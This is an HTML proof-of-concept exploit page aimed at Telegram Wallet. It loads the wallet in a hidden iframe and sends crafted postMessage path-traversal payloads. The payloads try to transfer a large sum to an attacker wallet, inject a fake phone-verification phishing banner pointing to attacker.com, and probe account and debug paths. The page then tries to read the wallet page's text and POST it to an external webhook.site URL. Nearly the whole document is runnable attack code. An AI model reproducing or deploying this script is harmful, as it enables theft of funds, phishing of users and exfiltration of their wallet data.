
<!DOCTYPE html>
<html>
  <head>
    <title>Telegram Wallet Exploit PoC</title>
  </head>
  <body>
    <h1>Telegram Wallet Exploit Demo</h1>
    <p>This PoC shows how a background attacker page can silently trigger authenticated actions inside Telegram Wallet.</p>

    <!-- Load Telegram Wallet Start Page in Hidden iframe -->
    <iframe id="tg_frame" src="https://t.me/wallet/start" style="display:none;"></iframe>

<script>
  const payloads = [
    "../../../wallet/send?amount=1000000&to=@attacker_wallet",
"../../../wallet/accounts",
"../../../wallet/start?banner=verify_phone&title=Update+Required&text=Your+TON+Wallet+must+be+verified.+Click+here+to+secure+it.&url=https://attacker.com",
"../../../wallet/ton-space",
"../../../wallet/debug"
  ];

  let index = 0;

  const sendPayload = () => {
    const testPayload = payloads[index];
    console.log("üöÄ Sending payload:", testPayload);

    const message = JSON.stringify({
      eventType: 'web_app_open_tg_link',
      eventData: {
        path_full: `/wallet/start?x=${encodeURIComponent(testPayload)}`
      }
    });

    const iframe = document.getElementById("tg_frame");

    if (iframe && iframe.contentWindow) {
      iframe.contentWindow.postMessage(message, "*");
    } else {
      console.warn("‚ö†Ô∏è iframe not ready or blocked.");
    }

    index++;
    if (index < payloads.length) {
      setTimeout(sendPayload, 2500);
    }
  };

  window.onload = function () {
    const iframe = document.getElementById("tg_frame");

    iframe.onload = function () {
      console.log("‚úÖ iframe loaded");
      sendPayload();

      // Wait and try DOM exfiltration
      setTimeout(() => {
        try {
          const walletDoc = iframe.contentWindow.document || iframe.contentDocument;
          const text = walletDoc.body.innerText || "[NO TEXT FOUND]";
          console.log("üì§ Captured Telegram Wallet content:", text);

          fetch("https://webhook.site/92fb9b80-9c28-4b47-a05f-da60e5e72ca4", {
            method: "POST",
            headers: {
              "Content-Type": "text/plain"
            },
            body: text
          });
        } catch (e) {
          console.error("‚ùå DOM read failed:", e.message);
        }
      }, 3000);
    };

    iframe.onerror = function () {
      console.error("‚ùå iframe failed to load");
    };
  };
</script>
    
  </body>
</html>
